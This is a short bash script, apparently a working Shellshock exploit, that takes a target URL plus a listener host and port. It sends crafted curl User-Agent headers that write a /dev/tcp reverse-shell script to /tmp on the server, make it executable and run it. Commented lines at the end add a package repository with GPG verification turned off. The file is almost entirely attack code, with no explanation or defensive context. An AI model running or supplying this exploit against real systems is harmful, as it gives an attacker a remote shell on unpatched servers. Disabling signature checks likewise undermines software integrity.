#!/bin/bash
APP_URL="$1"
REVERS_HOST="$2"
REVERS_PORT="$3"


# curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /usr/bin/whoami" ${APP_URL}

curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; echo \"bash -i >& /dev/tcp/${REVERS_HOST}/${REVERS_PORT} 0>&1\" > /tmp/revers.sh" ${APP_URL}

curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /usr/bin/chmod +x /tmp/revers.sh" ${APP_URL}

curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /tmp/revers.sh" ${APP_URL}


#yum-config-manager --add-repo="http://mirror.centos.org/centos/7/os/x86_64/" --nogpgcheck

#echo "gpgcheck=0" >> mirror.centos.org_centos_7_os_x86_64_.repo

#4294967295

